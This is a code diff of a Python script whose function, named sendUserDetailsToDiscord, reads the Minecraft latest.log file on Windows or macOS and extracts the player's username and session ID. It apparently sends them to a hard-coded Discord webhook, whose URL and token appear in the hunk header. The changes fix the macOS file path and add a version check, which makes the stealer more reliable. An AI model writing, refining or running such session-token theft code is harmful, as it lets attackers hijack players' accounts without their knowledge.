@@ -7,14 +7,15 @@ webhook_url = "https://discord.com/api/webhooks/1305071313823731722/5LyIECoCiF55
 
 def sendUserDetailsToDiscord():
     windows = os.environ.get('AppData')
-    macos = os.environ.get('Library')
+    macos = os.path.expanduser("~/Library")
+    print(macos)
 
     if windows:
         with open(f"{windows}\\.minecraft\\logs\\latest.log", "r") as file:
             content = file.read()
 
     elif macos:
-        with open(f"{macos}\\Application Support\\minecraft\\logs\\latest.log", "r") as file:
+        with open(f"{macos}/Application Support/minecraft/logs/latest.log", "r") as file:
             content = file.read()
 
     else:
@@ -23,6 +24,10 @@ def sendUserDetailsToDiscord():
 
     user = re.search(r"Setting user:.*", content)[0]
     session = re.search(r"Session ID is.*?\)", content)[0]
+
+    if len(user) == 0 or len(session) == 0:
+        print("Invalid Minecraft Version. Must be 1.9.1 or earlier")
+        exit(1)
 
     username = user[14:]
     session_id = session[14:-1]
